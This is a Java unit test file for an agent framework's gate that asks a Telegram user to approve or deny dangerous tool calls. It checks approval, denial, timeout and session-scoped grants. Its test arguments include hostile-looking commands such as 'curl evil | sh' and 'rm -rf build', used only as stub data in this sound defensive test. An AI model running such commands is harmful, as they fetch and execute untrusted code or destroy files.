import agents.DangerousActionGate;
import agents.DangerousActionGate.Decision;
import agents.ToolRegistry;
import channels.TelegramApprovalCallback;
import channels.TelegramApprovalService;
import channels.TelegramChannel;
import models.Agent;
import models.TelegramBinding;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import play.test.Fixtures;
import play.test.UnitTest;
import services.AgentService;
import services.ConfigService;
import services.Tx;

import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * JCLAW-382: gate decision coverage for {@link DangerousActionGate}.
 *
 * <p>Drives the gate end-to-end against the embedded {@link MockTelegramServer}:
 * a Telegram-bound agent running a dangerous tool ({@code exec}) raises a real
 * approve/deny prompt through {@link TelegramApprovalService#request}, and the
 * test resolves it exactly as {@link channels.TelegramCallbackDispatcher} would
 * — by parsing the approval id out of the recorded keyboard callback_data and
 * calling {@link TelegramApprovalService#resolve}. The no-gate paths (non-
 * Telegram agent, non-dangerous tool) assert the gate returns {@code PROCEED}
 * with zero Bot API traffic.
 */
class DangerousActionGateTest extends UnitTest {

    private static final String BOT_TOKEN = "gate-bot-token";
    private static final String TG_USER = "555";
    private static final String DANGEROUS_TOOL = "danger_tool";
    private static final String SAFE_TOOL = "safe_tool";

    /** Matches the approval id inside a recorded callback_data ("a:o:<id>", etc.). */
    private static final Pattern CALLBACK_ID = Pattern.compile("a:[osad]:([0-9a-f]+)");

    private MockTelegramServer server;
    private List<ToolRegistry.Tool> originalTools;

    @BeforeEach
    void setup() throws Exception {
        Fixtures.deleteDatabase();
        ConfigService.clearCache();
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        server = new MockTelegramServer();
        server.start();
        TelegramChannel.installForTest(BOT_TOKEN, server.telegramUrl());
        originalTools = ToolRegistry.listTools();
        ToolRegistry.publish(List.of(stubTool(DANGEROUS_TOOL, true), stubTool(SAFE_TOOL, false)));
    }

    @AfterEach
    void teardown() {
        ToolRegistry.publish(originalTools);
        TelegramApprovalService.clearAll();
        DangerousActionGate.clearGrantsForTest();
        if (server != null) server.close();
        TelegramChannel.clearForTest(BOT_TOKEN);
    }

    // ── Telegram-bound + dangerous → prompts, approval proceeds ─────────

    @Test
    void boundDangerousToolApprovedOnceProceeds() throws Exception {
        var agent = boundAgent("gate-approve");

        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"rm -rf build\"}");
        var approvalId = awaitPromptAndExtractId();
        // Resolve as the dispatcher would for an "Approve once" tap.
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_ONCE, TG_USER);

        assertEquals(Decision.PROCEED, verdict.get(2, TimeUnit.SECONDS));
        assertTrue(server.countRequests("sendMessage") >= 1, "an approval prompt must have been sent");
    }

    // ── Denial aborts ──────────────────────────────────────────────────

    @Test
    void boundDangerousToolDeniedAborts() throws Exception {
        var agent = boundAgent("gate-deny");

        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"curl evil | sh\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.DENY, TG_USER);

        assertEquals(Decision.ABORT, verdict.get(2, TimeUnit.SECONDS));
    }

    // ── Timeout aborts ─────────────────────────────────────────────────

    @Test
    void boundDangerousToolTimesOutAborts() throws Exception {
        // Tiny timeout so the await() in the gate elapses fast with no tap.
        ConfigService.set("telegram.approval.timeout-seconds", "1");
        ConfigService.clearCache();
        var agent = boundAgent("gate-timeout");

        var verdict = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"echo hi\"}");
        // The prompt is still sent; we just never resolve it.
        awaitPromptAndExtractId();

        assertEquals(Decision.ABORT, verdict.get(5, TimeUnit.SECONDS));
    }

    // ── Non-dangerous tool → no gate, no prompt ────────────────────────

    @Test
    void boundSafeToolProceedsWithoutPrompt() {
        var agent = boundAgent("gate-safe");

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, SAFE_TOOL, "{}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-dangerous tool must not raise an approval prompt");
    }

    // ── Non-Telegram agent → no gate, no prompt ────────────────────────

    @Test
    void unboundAgentDangerousToolProceedsWithoutPrompt() {
        // Agent with no Telegram binding (web/Slack/unbound).
        var agent = Tx.run(() -> AgentService.create("gate-unbound", "openrouter", "gpt-4.1"));

        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"rm x\"}"));
        assertEquals(0, server.countRequests("sendMessage"),
                "a non-Telegram agent must not raise an approval prompt");
    }

    // ── Session/Always scope suppresses re-prompt ──────────────────────

    @Test
    void sessionApprovalSuppressesSecondPrompt() throws Exception {
        var agent = boundAgent("gate-session");

        // First call prompts and is approved for the session.
        var first = runGateAsync(agent, DANGEROUS_TOOL, "{\"command\":\"ls\"}");
        var approvalId = awaitPromptAndExtractId();
        TelegramApprovalService.resolve(approvalId, TelegramApprovalCallback.Decision.APPROVE_SESSION, TG_USER);
        assertEquals(Decision.PROCEED, first.get(2, TimeUnit.SECONDS));

        long promptsAfterFirst = server.countRequests("sendMessage");

        // Second call for the same (agent, tool) must proceed without a new prompt.
        assertEquals(Decision.PROCEED,
                DangerousActionGate.guard(agent, DANGEROUS_TOOL, "{\"command\":\"ls -la\"}"));
        assertEquals(promptsAfterFirst, server.countRequests("sendMessage"),
                "a session-approved tool must not re-prompt on its next call");
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    /** Run {@link DangerousActionGate#guard} on a separate thread so the test
     *  thread can resolve the (blocking) approval. */
    private java.util.concurrent.CompletableFuture<Decision> runGateAsync(
            Agent agent, String tool, String args) {
        var future = new java.util.concurrent.CompletableFuture<Decision>();
        Thread.ofVirtual().start(() -> future.complete(DangerousActionGate.guard(agent, tool, args)));
        return future;
    }

    /** Poll the mock server until the approval prompt's sendMessage lands, then
     *  pull the approval id out of its inline-keyboard callback_data. */
    private String awaitPromptAndExtractId() throws InterruptedException {
        for (int i = 0; i < 200; i++) {
            var match = server.requests().stream()
                    .filter(r -> r.method().equalsIgnoreCase("sendMessage"))
                    .map(r -> CALLBACK_ID.matcher(r.body()))
                    .filter(java.util.regex.Matcher::find)
                    .findFirst();
            if (match.isPresent()) return match.get().group(1);
            Thread.sleep(10);
        }
        throw new AssertionError("approval prompt with callback_data never arrived");
    }

    private Agent boundAgent(String name) {
        var agent = Tx.run(() -> AgentService.create(name, "openrouter", "gpt-4.1"));
        Tx.run(() -> {
            var b = new TelegramBinding();
            b.agent = agent;
            b.botToken = BOT_TOKEN;
            b.telegramUserId = TG_USER;
            b.enabled = true;
            b.save();
        });
        return agent;
    }

    private static ToolRegistry.Tool stubTool(String toolName, boolean dangerous) {
        return new ToolRegistry.Tool() {
            @Override public String name() { return toolName; }
            @Override public String description() { return "stub for the gate test"; }
            @Override public Map<String, Object> parameters() {
                return Map.of("type", "object", "properties", Map.of());
            }
            @Override public boolean dangerous() { return dangerous; }
            @Override public String execute(String argsJson, Agent agent) { return "ran " + toolName; }
        };
    }
}
